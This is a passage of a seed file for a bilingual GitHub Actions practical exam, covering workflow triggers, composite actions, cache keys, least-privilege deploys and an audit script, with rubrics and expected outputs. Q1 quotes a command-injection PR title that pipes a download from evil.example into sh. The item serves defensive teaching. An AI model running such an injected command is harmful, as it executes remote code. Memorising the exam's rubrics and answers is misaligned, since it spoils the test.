  'bao $([ "$n" -eq "$so_tep" ] && echo 0 || echo 1) "workflow khai permissions:" "$n / $so_tep"\n' +
  '\n' +
  '# YAML tra chuoi "false" cho dang co nhay, va chuoi khac rong la DUNG\n' +
  '# -> buoc VAN CHAY. Day la loi hong theo huong MO.\n' +
  'n=$(grep -h -c "if: *[\'\\"]false[\'\\"]" "$W"/*.yml 2>/dev/null | awk \'{s+=$1} END{print s+0}\')\n' +
  'bao $([ "$n" -eq 0 ] && echo 0 || echo 1) "if: \'false\' (chuoi -> BUOC VAN CHAY)" "$n cho"\n' +
  '\n' +
  '# Khoa cache khong co hashFiles = khoa HANG SO = dong cung o lan chay MOT.\n' +
  'n=$(grep -h -A4 \'actions/cache@\' "$W"/*.yml 2>/dev/null | grep \'^[[:space:]]*key:\' | grep -c -v \'hashFiles\' | tr -d \' \')\n' +
  'bao $([ "$n" -eq 0 ] && echo 0 || echo 1) "khoa cache KHONG co hashFiles" "$n khoa"\n' +
  '\n' +
  'n=$(grep -h -o \'${{ *secrets\\.[A-Za-z_0-9]*\' "$W"/*.yml 2>/dev/null | wc -l | tr -d \' \')\n' +
  'printf \'  TIN       %-42s %s\\n\' "luot tham chieu secrets.*" "$n"\n' +
  '\n' +
  'echo\n' +
  'echo "  ket qua: $dat dat, $canh_bao canh bao"\n' +
  '[ "$canh_bao" -eq 0 ]\n';

const Q5_OUTPUT =
  '$ bash Q5/soat.sh Q5/hong          # thu muc HONG ma de cho san\n' +
  '=== SOAT WORKFLOW: Q5/hong ===\n' +
  '  (1 tep .yml)\n' +
  '\n' +
  '  CANH BAO  bieu thuc github.event trong run:          1 cho\n' +
  '  DAT       workflow dung pull_request_target          0 workflow\n' +
  '  CANH BAO  action ghim vao mot NHANH                  1 cho\n' +
  '  CANH BAO  action ghim bang SHA                       0 / 3\n' +
  '  CANH BAO  workflow khai permissions:                 0 / 1\n' +
  "  CANH BAO  if: 'false' (chuoi -> BUOC VAN CHAY)       1 cho\n" +
  '  CANH BAO  khoa cache KHONG co hashFiles              1 khoa\n' +
  '  TIN       luot tham chieu secrets.*                  0\n' +
  '\n' +
  '  ket qua: 1 dat, 6 canh bao\n' +
  'exit=1\n' +
  '\n' +
  '$ bash Q5/soat.sh .github/workflows   # kho api-backend that, 10/09/2026\n' +
  '=== SOAT WORKFLOW: .github/workflows ===\n' +
  '  (11 tep .yml)\n' +
  '\n' +
  '  DAT       bieu thuc github.event trong run:          0 cho\n' +
  '  DAT       workflow dung pull_request_target          0 workflow\n' +
  '  DAT       action ghim vao mot NHANH                  0 cho\n' +
  '  CANH BAO  action ghim bang SHA                       0 / 21\n' +
  '  CANH BAO  workflow khai permissions:                 1 / 11\n' +
  "  DAT       if: 'false' (chuoi -> BUOC VAN CHAY)       0 cho\n" +
  '  DAT       khoa cache KHONG co hashFiles              0 khoa\n' +
  '  TIN       luot tham chieu secrets.*                  44\n' +
  '\n' +
  '  ket qua: 5 dat, 2 canh bao\n' +
  'exit=1\n' +
  '\n' +
  '-- Con so 44 la phep kiem cheo --\n' +
  'Bai 6.5 dem TAY duoc 44 luot, con script cua no dung `grep -c` va ra 35.\n' +
  'Chenh 9 = dung 9 ban chep cua khoi SSH, moi ban co MOT dong hai secret.\n' +
  '`grep -o | wc -l` dem SO LAN nen no khop lai voi phep dem tay.';

export default {
  course: { slug: 'github-actions' },
  exams: [
    {
      kind: 'PE',
      peType: 'CODE',
      code: 'PE',
      source: 'SAMPLE',
      sortOrder: 10,
      title: B(
        'Practical Exam — write the workflow, then let a parser judge it',
        'Thi thực hành — viết workflow, rồi để một bộ đọc chấm nó',
      ),
      description: B(
        'Five practical questions, submitted as a .zip. A workflow that fires on exactly the events named and stays reportable as a required check, a composite action that replaces nine drifted copies of one block, a pair of cache keys that change exactly when their content should, a deploy job with least-privilege permissions and no secret inside a run: body, and an audit script that flags the defects this course measured — chapters 1, 2, 3, 4, 5, 6, 7, 8 and 10.',
        'Năm câu thực hành, nộp dưới dạng .zip. Một workflow nổ đúng những sự kiện được nêu tên và vẫn báo cáo được với tư cách một required check, một composite action thay chín bản chép đã trôi dạt của cùng một khối, một cặp khoá cache đổi đúng lúc nội dung của chúng cần đổi, một job deploy theo quyền tối thiểu mà không bí mật nào nằm trong thân run:, và một script soi ra đúng những khuyết tật mà khoá học này đã đo — các chương 1, 2, 3, 4, 5, 6, 7, 8 và 10.',
      ),
      durationMinutes: 120,
      totalPoints: 10,
      passMark: 5,
      isPublished: true,
      instructions: INSTRUCTIONS,
      questions: [

        /* ── Q1 · chương 1 + 2 + 3 ─────────────────────────────────── */
        codeQ({
          points: 2,
          language: 'yaml',
          prompt: B(
            '<p><b>Q1 — A workflow that fires at exactly the right moments (chapters 1, 2 and 3).</b> Write <code>Q1/kiem.yml</code>. It must satisfy every line below, and each line is graded against a parser or an evaluator rather than against a reading.</p>' +
            '<ul>' +
            '<li><b>Three entry points.</b> A pull request targeting <code>main</code>; a push to <code>main</code> that touches <code>src/**</code>, <code>frontend/src/**</code> or <code>package-lock.json</code>; and a manual run with one input, <code>bo_qua_test</code>, of type boolean and default false. One of those three must <b>not</b> carry a <code>paths:</code> filter, and the file must say in a comment which one and why — get this backwards and a documentation-only PR is permanently unmergeable behind a required check.</li>' +
            '<li><b>The version number.</b> <code>setup-node</code> must actually receive Node 22. Parse your file and check the <em>type</em> of what you wrote: this is the trap that turns <code>18.20</code> into the number 18.2.</li>' +
            '<li><b>The test step is skippable.</b> <code>if:</code> on the test step must skip it when <code>bo_qua_test</code> is set and run it otherwise. Note what a boolean input actually arrives as — the negation form is measured in the expected output and it is wrong in both directions.</li>' +
            '<li><b>The PR title.</b> One step must print the pull request title, and it must reach the shell as <b>data</b>. A title of ' + c('a"; curl evil.example/x | sh; #') + ' must not run three commands.</li>' +
            '<li><b>The job frame.</b> A pinned runner rather than a floating one, an explicit <code>timeout-minutes</code> (the default is 360), a <code>concurrency</code> group that does not let two different PRs cancel each other, a workflow-level <code>permissions:</code> block naming the minimum, and one line that gives every <code>run:</code> in the job <code>pipefail</code>.</li>' +
            '</ul>',

            '<p><b>Câu 1 — Một workflow nổ đúng những khoảnh khắc cần nổ (chương 1, 2 và 3).</b> Hãy viết <code>Q1/kiem.yml</code>. Nó phải thoả mọi dòng dưới đây, và mỗi dòng được chấm bằng một bộ đọc hoặc một bộ đánh giá chứ không phải bằng cách đọc bằng mắt.</p>' +
            '<ul>' +
            '<li><b>Ba cửa vào.</b> Một pull request nhắm vào <code>main</code>; một cú push vào <code>main</code> có đụng <code>src/**</code>, <code>frontend/src/**</code> hoặc <code>package-lock.json</code>; và một lần chạy tay với đúng một input là <code>bo_qua_test</code>, kiểu boolean, mặc định false. MỘT trong ba cửa đó <b>không</b> được mang bộ lọc <code>paths:</code>, và tệp phải nói rõ trong một chú thích là cửa nào và VÌ SAO — làm ngược lại là một PR chỉ sửa tài liệu sẽ vĩnh viễn không gộp được vì kẹt sau một required check.</li>' +
            '<li><b>Số phiên bản.</b> <code>setup-node</code> phải thật sự nhận được Node 22. Hãy phân giải tệp của bạn rồi kiểm <em>KIỂU</em> của thứ bạn vừa viết: đây đúng là cái bẫy biến <code>18.20</code> thành số 18,2.</li>' +
            '<li><b>Bước test bỏ qua được.</b> <code>if:</code> trên bước test phải BỎ QUA nó khi <code>bo_qua_test</code> được bật và CHẠY nó trong trường hợp còn lại. Hãy để ý một input boolean thật ra tới nơi dưới dạng gì — dạng phủ định được đo sẵn trong kết quả mong đợi và nó SAI ở cả hai chiều.</li>' +
            '<li><b>Tiêu đề PR.</b> Một bước phải in ra tiêu đề của pull request, và tiêu đề ấy phải tới được shell dưới dạng <b>DỮ LIỆU</b>. Một tiêu đề là ' + c('a"; curl evil.example/x | sh; #') + ' không được phép chạy ra ba câu lệnh.</li>' +
            '<li><b>Khung của job.</b> Một runner đã ghim chứ không phải một nhãn trôi nổi, một <code>timeout-minutes</code> tường minh (mặc định là 360), một nhóm <code>concurrency</code> không để hai PR khác nhau huỷ lẫn nhau, một khối <code>permissions:</code> ở mức workflow nêu đúng mức tối thiểu, và MỘT dòng cho mọi <code>run:</code> trong job có <code>pipefail</code>.</li>' +
            '</ul>',
          ),
          starterCode: starter(1, 'kiem.yml',
            'Kiem bang:\n' +
            '  node -e "const y=require(\'js-yaml\'),f=require(\'fs\');\n' +
            '           console.log(JSON.stringify(y.load(f.readFileSync(\'Q1/kiem.yml\',\'utf8\')),null,1))"\n' +
            'Phat lai bo loc paths bang minimatch tren sau commit mau trong\n' +
            'khoi "ket qua mong doi", va danh gia hai dieu kien if: bang\n' +
            '@actions/expressions voi bo_qua_test = "false" roi = "true".'),
          expectedOutput: Q1_OUTPUT,
          sampleSolution: Q1_SOLUTION,
          rubric: rubric([
            ['trigger',
              'All three entry points are present with the right filters, and the trigger that must not carry <code>paths:</code> is the <code>pull_request</code> one, with a comment saying why — a filtered-out required check never reports and the PR sits at "Expected — Waiting for status to be reported".',
              'Đủ cả ba cửa vào với đúng bộ lọc, và cửa KHÔNG được mang <code>paths:</code> chính là <code>pull_request</code>, kèm một chú thích nói rõ vì sao — một required check bị lọc ra thì không bao giờ báo và PR kẹt ở "Expected — Waiting for status to be reported".',
              0.6],
            ['kieu',
              'Parsed, <code>node-version</code> is the STRING <code>"22"</code> and not a number, and replaying the <code>paths:</code> patterns over the six sample commits selects exactly the three that touch a listed path.',
              'Phân giải ra thì <code>node-version</code> là CHUỖI <code>"22"</code> chứ không phải một số, và phát lại các mẫu <code>paths:</code> trên sáu commit mẫu chọn đúng ba cái có đụng vào một đường dẫn được liệt kê.',
              0.5],
            ['dieukien',
              'The test step compares explicitly against the string — <code>inputs.bo_qua_test != \'true\'</code> — so it runs when the input is <code>"false"</code> and skips when it is <code>"true"</code>; the negation form, which is false in both cases, is not used.',
              'Bước test SO SÁNH TƯỜNG MINH với chuỗi — <code>inputs.bo_qua_test != \'true\'</code> — nên nó chạy khi input là <code>"false"</code> và bị bỏ qua khi là <code>"true"</code>; dạng phủ định, vốn cho false ở cả hai ca, không được dùng.',
              0.5],
            ['khung',
              'The PR title reaches the shell through <code>env:</code> and no <code>${{ github.event… }}</code> appears in any <code>run:</code> body; and the frame is complete — pinned runner, <code>timeout-minutes</code>, a per-ref concurrency group, a minimal <code>permissions:</code>, and <code>shell: bash</code> applied to the whole job.',
              'Tiêu đề PR tới shell qua <code>env:</code> và không <code>${{ github.event… }}</code> nào xuất hiện trong thân bất kỳ <code>run:</code> nào; và khung đầy đủ — runner đã ghim, có <code>timeout-minutes</code>, nhóm concurrency theo từng ref, một <code>permissions:</code> tối thiểu, và <code>shell: bash</code> áp cho cả job.',
              0.4],
          ]),
        }),

        /* ── Q2 · chương 4 (+ 6) ───────────────────────────────────── */
        codeQ({
          points: 2,
          language: 'yaml',
          prompt: B(
            '<p><b>Q2 — Replace nine drifted copies with one composite action (chapter 4).</b> This repository has nine copies of a ten-line SSH-setup block spread across nine workflows, and they have already drifted into two versions: seven carry no keep-alive settings and two carry <code>ServerAliveInterval</code>, <code>ServerAliveCountMax</code> and <code>ConnectTimeout</code>. Nothing anywhere records which copies are the un-fixed ones.</p>' +
            '<p>Write <code>Q2/action.yml</code>, a composite action that all nine call sites can use, plus <code>Q2/goi.yml</code> containing the two steps that call it. Requirements:</p>' +
            '<ul>' +
            '<li><b>Three declared inputs</b>: the host, the SSH user, and the private key <em>base64-encoded</em>. The action writes the key to <code>~/.ssh/deploy_key</code> with mode 600, adds the host to <code>known_hosts</code>, and writes a <code>~/.ssh/config</code> that keeps the fixed version — the one <b>with</b> the three keep-alive lines.</li>' +
            '<li><b>Two restrictions that bite immediately.</b> One is mandatory on every <code>run:</code> inside a composite action and is the first thing that errors if you forget it. The other is a context a composite action cannot read at all, which is why the credentials have to arrive the way they do.</li>' +
            '<li><b>The decoded key is outside the mask.</b> GitHub masks the base64 string it stores, and the decoded form shares zero substrings with it. Register the decoded value before any later step could print it.</li>' +
            '<li><b>The call site.</b> <code>Q2/goi.yml</code> must show the step that has to come first before a local <code>uses: ./…</code> works at all, and must pass the three secrets in as inputs.</li>' +
            '</ul>',

            '<p><b>Câu 2 — Thay chín bản chép đã trôi dạt bằng một composite action (chương 4).</b> Kho này có chín bản chép của một khối cài SSH dài mười dòng nằm rải ở chín workflow, và chúng đã trôi thành hai phiên bản: bảy bản không có thiết lập giữ-kết-nối và hai bản có <code>ServerAliveInterval</code>, <code>ServerAliveCountMax</code> và <code>ConnectTimeout</code>. Chẳng chỗ nào ghi lại bản nào là bản CHƯA được vá.</p>' +
            '<p>Hãy viết <code>Q2/action.yml</code>, một composite action mà cả chín nơi gọi đều dùng được, cộng với <code>Q2/goi.yml</code> chứa hai bước gọi tới nó. Yêu cầu:</p>' +
            '<ul>' +
            '<li><b>Ba input được khai báo</b>: tên máy chủ, người dùng SSH, và khoá riêng <em>đã mã hoá base64</em>. Action ghi khoá ra <code>~/.ssh/deploy_key</code> với quyền 600, thêm máy chủ vào <code>known_hosts</code>, và ghi một <code>~/.ssh/config</code> giữ đúng phiên bản ĐÃ VÁ — tức bản <b>CÓ</b> ba dòng giữ-kết-nối.</li>' +
            '<li><b>Hai ràng buộc cắn ngay lập tức.</b> Một cái là BẮT BUỘC trên mọi <code>run:</code> bên trong một composite action và là thứ báo lỗi đầu tiên nếu bạn quên. Cái kia là một context mà composite action hoàn toàn không đọc được, và đó chính là lý do thông tin đăng nhập phải tới theo cái cách nó tới.</li>' +
            '<li><b>Bản khoá đã giải mã nằm NGOÀI mặt nạ.</b> GitHub che cái chuỗi base64 mà nó lưu, còn bản đã giải mã thì không chung với nó một chuỗi con nào. Hãy đăng ký giá trị đã giải mã TRƯỚC khi có bước nào về sau kịp in nó ra.</li>' +
            '<li><b>Nơi gọi.</b> <code>Q2/goi.yml</code> phải cho thấy cái bước bắt buộc phải đứng TRƯỚC thì một <code>uses: ./…</code> cục bộ mới chạy được, và phải truyền ba bí mật vào dưới dạng input.</li>' +
            '</ul>',
          ),
          starterCode: starter(2, 'action.yml',
            'Dat tep tai .github/actions/ssh-vps/action.yml trong kho nhap.\n' +
            'Kiem bang: phan giai action.yml bang js-yaml roi dem\n' +
            '  (a) so buoc run: THIEU shell:      -> phai la 0\n' +
            '  (b) so lan xuat hien "secrets."    -> phai la 0\n' +
            '  (c) so buoc run: co noi suy ${{ }} -> phai la 0\n' +
            'roi tach tung khoi run: ra tep va chay `bash -n` len no.'),
          expectedOutput: Q2_OUTPUT,
          sampleSolution: Q2_SOLUTION,
          rubric: rubric([
            ['composite',
              'The action declares <code>runs.using: composite</code> with the three named inputs, and EVERY <code>run:</code> inside it names a <code>shell:</code> — a composite action with a shell-less <code>run:</code> is an error rather than a default.',
              'Action khai <code>runs.using: composite</code> với ba input đúng tên, và MỌI <code>run:</code> bên trong đều nêu <code>shell:</code> — một composite action có <code>run:</code> thiếu shell là một LỖI chứ không phải một mặc định.',
              0.6],
            ['bimat',
              'The action never references <code>secrets.*</code> — it cannot — and the three values reach the script through <code>env:</code> rather than being interpolated into the <code>run:</code> body; the counted interpolations are zero.',
              'Action không bao giờ tham chiếu <code>secrets.*</code> — nó không đọc được — và ba giá trị tới script qua <code>env:</code> chứ không nội suy vào thân <code>run:</code>; số lần nội suy đếm được là 0.',
              0.5],
            ['mask',
              'The decoded key is registered with <code>::add-mask::</code> immediately after it is written and before anything else could print it, and the key file and config are both created with mode 600.',
              'Bản khoá đã giải mã được đăng ký bằng <code>::add-mask::</code> ngay sau khi ghi ra và trước khi có gì khác kịp in nó, và cả tệp khoá lẫn tệp config đều được tạo với quyền 600.',
              0.5],
            ['goi',
              'The config written keeps the fixed variant with all three keep-alive lines, the call site checks out the repository before the local <code>uses: ./…</code>, and it passes the three secrets in through <code>with:</code>.',
              'Tệp config ghi ra giữ đúng biến thể ĐÃ VÁ với cả ba dòng giữ-kết-nối, nơi gọi có checkout kho TRƯỚC lời gọi <code>uses: ./…</code> cục bộ, và nó truyền ba bí mật vào qua <code>with:</code>.',
              0.4],
          ]),
        }),

        /* ── Q3 · chương 5 (+ 3) ───────────────────────────────────── */
        codeQ({
          points: 2,
          language: 'yaml',
          prompt: B(
            '<p><b>Q3 — Two cache keys that change exactly when they should (chapter 5).</b> The broken workflow in the instructions carries this step, which has been running for months in a green job:</p>' +
            code('      - uses: actions/cache@v4\n' +
              '        with:\n' +
              '          path: node_modules/.cache\n' +
              '          key: backend-cache') +
            '<p>It is wrong in two independent ways at once, and each one alone would be enough to make it useless. Write <code>Q3/cache.yml</code> — the corrected steps, ready to paste into a job — plus <code>Q3/tsconfig-them.json</code>, the compiler options that make the new cached path exist at all.</p>' +
            '<ul>' +
            '<li><b>Three steps.</b> The one-line package-manager cache on <code>setup-node</code>; a Next.js build cache over <code>frontend/.next/cache</code>; and a replacement for the dead step, caching something this project actually writes.</li>' +
            '<li><b>Every key must contain three parts:</b> a literal prefix that names the contents, the platform, and a content hash. Say in a comment what each part is for — in particular, what goes wrong without the platform.</li>' +
            '<li><b><code>restore-keys</code> on the Next.js cache, and a comment justifying it.</b> The rule is not about speed: name the condition under which a stale hit is acceptable, and note what the post step does after a prefix hit.</li>' +
            '<li><b>Show the arithmetic.</b> In the expected-output block, compute both keys for real against this repository\'s lockfiles, show that swapping the two arguments of <code>hashFiles</code> gives the same hash, and show what the key collapses to when the glob has a typo.</li>' +
            '</ul>',

            '<p><b>Câu 3 — Hai khoá cache đổi ĐÚNG LÚC chúng cần đổi (chương 5).</b> Cái workflow hỏng trong phần hướng dẫn mang theo bước này, và nó đã chạy suốt nhiều tháng trong một job đang xanh:</p>' +
            code('      - uses: actions/cache@v4\n' +
              '        with:\n' +
              '          path: node_modules/.cache\n' +
              '          key: backend-cache') +
            '<p>Nó sai theo HAI cách độc lập cùng lúc, và mỗi cách đứng riêng cũng đủ làm nó vô dụng. Hãy viết <code>Q3/cache.yml</code> — các bước đã sửa, sẵn sàng dán vào một job — cộng với <code>Q3/tsconfig-them.json</code>, tức những tuỳ chọn trình biên dịch làm cho đường dẫn được cache mới THẬT SỰ tồn tại.</p>' +
            '<ul>' +
            '<li><b>Ba bước.</b> Cái cache tải-về của trình quản lý gói viết một dòng trên <code>setup-node</code>; một cache bản dựng Next.js trên <code>frontend/.next/cache</code>; và một bước THAY THẾ cho bước chết, cache một thứ mà dự án này thật sự có ghi ra.</li>' +
            '<li><b>Mọi khoá phải có đủ ba phần:</b> một tiền tố chữ gọi tên nội dung, nền tảng, và một hash nội dung. Hãy nói trong chú thích mỗi phần để làm gì — nhất là chuyện gì hỏng nếu thiếu phần NỀN TẢNG.</li>' +
            '<li><b><code>restore-keys</code> cho cache Next.js, kèm một chú thích biện minh cho nó.</b> Luật ở đây không phải chuyện nhanh chậm: hãy gọi tên ĐIỀU KIỆN mà dưới đó một cú trúng cũ là chấp nhận được, và ghi rõ bước post làm gì sau một cú trúng tiền tố.</li>' +
            '<li><b>Trình ra phép tính.</b> Trong khối kết quả mong đợi, hãy tính THẬT cả hai khoá trên các lockfile của kho này, cho thấy đảo hai tham số của <code>hashFiles</code> vẫn ra cùng một hash, và cho thấy khoá co lại thành cái gì khi glob bị gõ sai.</li>' +
            '</ul>',
          ),
          starterCode: starter(3, 'cache.yml',
            'Tai lap hashFiles bang node:crypto de tinh khoa cho ra so THAT:\n' +
            '  SHA-256 tung tep -> noi cac ban bam dang NHI PHAN theo danh sach\n' +
            '  DA SAP -> SHA-256 lan nua. Khong khop tep nao thi tra CHUOI RONG.\n' +
            'Dung DOAN mot cai hash; hay tinh no ra roi chep vao.'),
          expectedOutput: Q3_OUTPUT,
          sampleSolution: Q3_SOLUTION,
          rubric: rubric([
            ['khoa',
              'Every key carries a naming prefix, <code>runner.os</code> and a <code>hashFiles</code> over the right lockfile, and the two computed keys match the hex strings in the expected output exactly.',
              'Mọi khoá đều mang một tiền tố gọi tên, <code>runner.os</code> và một <code>hashFiles</code> trên đúng tệp khoá, và hai khoá tính ra khớp chính xác với các chuỗi hex trong kết quả mong đợi.',
              0.6],
            ['duongdan',
              'The dead step is replaced by one whose <code>path:</code> the project actually writes, and <code>tsconfig-them.json</code> supplies both <code>incremental</code> and <code>tsBuildInfoFile</code> — caching a path that no tool creates is the original bug and pointing the same step somewhere else without enabling the writer repeats it.',
              'Bước chết được thay bằng một bước có <code>path:</code> mà dự án thật sự ghi ra, và <code>tsconfig-them.json</code> cung cấp cả <code>incremental</code> lẫn <code>tsBuildInfoFile</code> — cache một đường dẫn không công cụ nào tạo ra chính là con bọ gốc, và trỏ cùng bước ấy sang chỗ khác mà không bật cái thứ ghi ra nó là lặp lại đúng con bọ đó.',
              0.5],
            ['restore',
              '<code>restore-keys</code> is present on the build cache with a comment stating the condition — a stale hit is an optimisation on top of a step that still runs, not a replacement for it — and noting that a prefix hit is still a primary-key miss, so the post step saves a new entry.',
              '<code>restore-keys</code> có mặt trên cache bản dựng kèm một chú thích nêu rõ điều kiện — một cú trúng cũ là phần tăng tốc ĐẶT LÊN TRÊN một bước vẫn chạy chứ không THAY THẾ nó — và ghi rõ rằng trúng tiền tố vẫn là trượt khoá chính, nên bước post sẽ lưu một mục mới.',
              0.5],
            ['giaithich',
              'The comments explain what the platform component prevents and why a constant key freezes on run one, and the expected-output block demonstrates both the order-independence of <code>hashFiles</code> and the empty string a typo\'d glob produces.',
              'Phần chú thích giải thích thành phần nền tảng ngăn được chuyện gì và vì sao một khoá hằng đông cứng ở lần chạy một, còn khối kết quả mong đợi trình ra cả tính độc lập với thứ tự của <code>hashFiles</code> lẫn cái chuỗi rỗng mà một glob gõ sai sinh ra.',
              0.4],
          ]),
        }),

        /* ── Q4 · chương 6 (+ 7, 9, 10) ────────────────────────────── */
        codeQ({
          points: 2,
          language: 'yaml',
          prompt: B(
            '<p><b>Q4 — A deploy job with the smallest token it can do the work with (chapter 6).</b> Write <code>Q4/deploy.yml</code>: a manually-triggered workflow that logs in to GHCR, swaps the image on a VPS over SSH, runs <code>prisma migrate deploy</code>, and verifies the result. Nine of this repository\'s workflows read an SSH key that opens the production server, and eight distinct third-party actions run alongside it — so the token this job carries is the thing being graded.</p>' +
            '<ul>' +
            '<li><b>Permissions in two layers.</b> A workflow-level block naming the minimum, and a job-level block that raises exactly one scope. Remember that a job-level block <em>replaces</em> the workflow-level one, and that naming any scope sets every unnamed one to <code>none</code> — so write a comment saying what that costs and how you would find out if you removed something a step needed.</li>' +
            '<li><b>An <code>environment:</code>.</b> Name it, give it a URL, and say in a comment which control it provides that a human pressing the Run button does not, and on what day that difference starts to matter.</li>' +
            '<li><b>Every secret through <code>env:</code>.</b> No <code>${{ secrets.* }}</code> and no <code>${{ github.event.* }}</code> anywhere inside a <code>run:</code> body — the count in the expected output is zero for both.</li>' +
            '<li><b>One derived value, masked.</b> The step that deploys computes the database host out of the connection string. That derived value is outside GitHub\'s mask; register it before it is printed.</li>' +
            '<li><b>The two operational choices.</b> Pick a <code>cancel-in-progress</code> value and justify it in a comment — this job runs a migration, so the side-effect question has one answer here. And end with a smoke test that fails the deploy on a 404 rather than trusting a health endpoint.</li>' +
            '</ul>',

            '<p><b>Câu 4 — Một job deploy với cái token NHỎ NHẤT vẫn làm được việc (chương 6).</b> Hãy viết <code>Q4/deploy.yml</code>: một workflow chạy tay, đăng nhập GHCR, tráo ảnh trên VPS qua SSH, chạy <code>prisma migrate deploy</code>, rồi kiểm chứng kết quả. Chín workflow của kho này đọc tới một khoá SSH mở được máy chủ production, và tám action bên thứ ba khác nhau chạy bên cạnh nó — nên cái token mà job này mang theo chính là thứ bị chấm.</p>' +
            '<ul>' +
            '<li><b>Quyền theo hai tầng.</b> Một khối ở mức workflow nêu mức tối thiểu, và một khối ở mức job nâng đúng MỘT phạm vi. Hãy nhớ khối ở mức job THAY THẾ khối ở mức workflow, và nêu tên bất kỳ phạm vi nào là đưa mọi phạm vi không nêu về <code>none</code> — nên hãy viết một chú thích nói cái đó tốn gì và bạn sẽ PHÁT HIỆN ra sao nếu lỡ gỡ mất thứ mà một bước cần.</li>' +
            '<li><b>Một <code>environment:</code>.</b> Đặt tên cho nó, cho nó một URL, và nói trong chú thích rằng nó cung cấp biện pháp kiểm soát nào mà một con người bấm nút Run KHÔNG cung cấp, và từ ngày nào thì khác biệt ấy bắt đầu có ý nghĩa.</li>' +
            '<li><b>Mọi bí mật đi qua <code>env:</code>.</b> Không <code>${{ secrets.* }}</code> và không <code>${{ github.event.* }}</code> ở bất cứ đâu trong thân một <code>run:</code> — con số đếm trong kết quả mong đợi là 0 cho cả hai.</li>' +
            '<li><b>Một giá trị DẪN XUẤT, phải che.</b> Bước deploy tính ra tên máy chủ cơ sở dữ liệu từ chuỗi kết nối. Giá trị dẫn xuất ấy nằm NGOÀI mặt nạ của GitHub; hãy đăng ký nó trước khi nó bị in ra.</li>' +
            '<li><b>Hai lựa chọn vận hành.</b> Chọn một giá trị <code>cancel-in-progress</code> và biện minh cho nó trong chú thích — job này chạy một migration, nên câu hỏi về tác dụng phụ ở đây chỉ có một đáp án. Và hãy kết thúc bằng một smoke test làm HỎNG cuộc deploy khi gặp 404, thay vì tin vào một điểm cuối health.</li>' +
            '</ul>',
          ),
          starterCode: starter(4, 'deploy.yml',
            'Kiem bang: phan giai deploy.yml bang js-yaml roi in ra\n' +
            '  permissions (tren cung va muc job), environment, concurrency,\n' +
            '  so buoc run: co noi suy secrets.* hoac github.event.* (phai la 0),\n' +
            '  va so buoc nhan bi mat qua env:.\n' +
            'Roi tach tung khoi run: ra tep rieng va chay `bash -n` len tung cai.'),
          expectedOutput: Q4_OUTPUT,
          sampleSolution: Q4_SOLUTION,
          rubric: rubric([
            ['quyen',
              'A workflow-level <code>permissions:</code> names the minimum and the job-level block raises exactly one scope while re-listing <code>contents: read</code>; a comment states that naming any scope zeroes the rest and how a silently removed scope would be found.',
              'Một khối <code>permissions:</code> ở mức workflow nêu mức tối thiểu và khối ở mức job nâng đúng một phạm vi trong khi vẫn liệt kê lại <code>contents: read</code>; một chú thích nói rõ rằng nêu tên bất kỳ phạm vi nào là đưa phần còn lại về không, và làm sao phát hiện một phạm vi bị gỡ trong im lặng.',
              0.6],
            ['bimat',
              'No secret and no event value is interpolated into any <code>run:</code> body — both counts are zero — every credential arrives through <code>env:</code>, and <code>persist-credentials: false</code> keeps checkout from leaving an auth header in <code>.git/config</code>.',
              'Không bí mật nào và không giá trị sự kiện nào bị nội suy vào thân một <code>run:</code> — cả hai phép đếm đều bằng 0 — mọi thông tin đăng nhập đều tới qua <code>env:</code>, và <code>persist-credentials: false</code> giữ cho checkout khỏi để lại một header xác thực trong <code>.git/config</code>.',
              0.5],
            ['dansuat',
              'The database host derived from the connection string is registered with <code>::add-mask::</code> BEFORE it is echoed, with a comment explaining that masking covers the stored string byte-for-byte and every transformation escapes it.',
              'Tên máy chủ cơ sở dữ liệu suy ra từ chuỗi kết nối được đăng ký bằng <code>::add-mask::</code> TRƯỚC khi nó bị in ra, kèm một chú thích giải thích rằng che bí mật chỉ phủ đúng chuỗi đã lưu theo từng byte và mọi phép biến đổi đều thoát khỏi nó.',
              0.5],
            ['vanhanh',
              'An <code>environment:</code> with a name and URL is declared and justified as the control that survives the trigger changing; <code>cancel-in-progress</code> is <code>false</code> with the migration named as the reason; and the smoke test fails the job on a 404 rather than trusting a health endpoint.',
              'Có khai một <code>environment:</code> kèm tên và URL, được biện minh là biện pháp kiểm soát SỐNG SÓT được khi trigger thay đổi; <code>cancel-in-progress</code> là <code>false</code> với lý do nêu đích danh cái migration; và smoke test làm hỏng job khi gặp 404 chứ không tin vào một điểm cuối health.',
              0.4],
          ]),
        }),

        /* ── Q5 · chương 8 + 10 (+ 1, 3, 4, 5, 6) ──────────────────── */
        codeQ({
          points: 2,
          language: 'bash',
          khongChayDuoc:
            'lời giải là một script soi một cây `.github/workflows/*.yml` có thật, nên nó không tự chứa — không có thư mục đầu vào thì mọi phép đếm đều ra 0 và output không khớp. Đã chạy thật HAI lượt trên GNU bash 3.2.57: trên thư mục hỏng đề cho sẵn ra "1 dat, 6 canh bao" và thoát 1; trên chính `.github/workflows` của kho api-backend (11 tệp, 10/09/2026) ra "5 dat, 2 canh bao", thoát 1, và đếm được ĐÚNG 44 lượt tham chiếu `secrets.*` — khớp phép đếm tay của bài 6.5, thứ mà `grep -c` ở đó đếm hụt còn 35',
          prompt: B(
            '<p><b>Q5 — A script that finds the defects this course measured (chapters 8 and 10).</b> Lesson 10.3 records a smoke test that could not smoke: it called <code>wget</code> inside a container that deliberately ships neither <code>wget</code> nor <code>curl</code>, its failure was swallowed by a <code>|| sleep 5</code>, and it burned about 25 seconds per deploy for weeks without being able to catch anything. A check that cannot fail is not a check.</p>' +
            '<p>Write <code>Q5/soat.sh</code>, taking a workflow directory as <code>$1</code> and defaulting to <code>.github/workflows</code>. It must print one line per check and exit non-zero if any check warns. The seven checks, each of which corresponds to a measured failure in this course:</p>' +
            '<ol>' +
            '<li>an event expression interpolated inside a <code>run:</code> body — the three-line injection from chapter 3;</li>' +
            '<li>any workflow using <code>pull_request_target</code>;</li>' +
            '<li>any action pinned to a branch rather than a tag or a SHA;</li>' +
            '<li>the SHA-pinning ratio, printed as <code>&lt;pinned&gt; / &lt;total&gt;</code>;</li>' +
            '<li>how many workflows declare <code>permissions:</code>, out of how many exist;</li>' +
            '<li>a quoted <code>if: \'false\'</code>, which is the condition that fails OPEN;</li>' +
            '<li>a cache key with no <code>hashFiles</code> in it, which freezes on run one.</li>' +
            '</ol>' +
            '<p>Then print, as information rather than a warning, the number of <code>secrets.*</code> references. <b>Count occurrences, not lines</b> — lesson 6.5\'s own audit script was out by nine here, and the nine were the nine copies of one SSH block whose <code>printf</code> line names two secrets.</p>' +
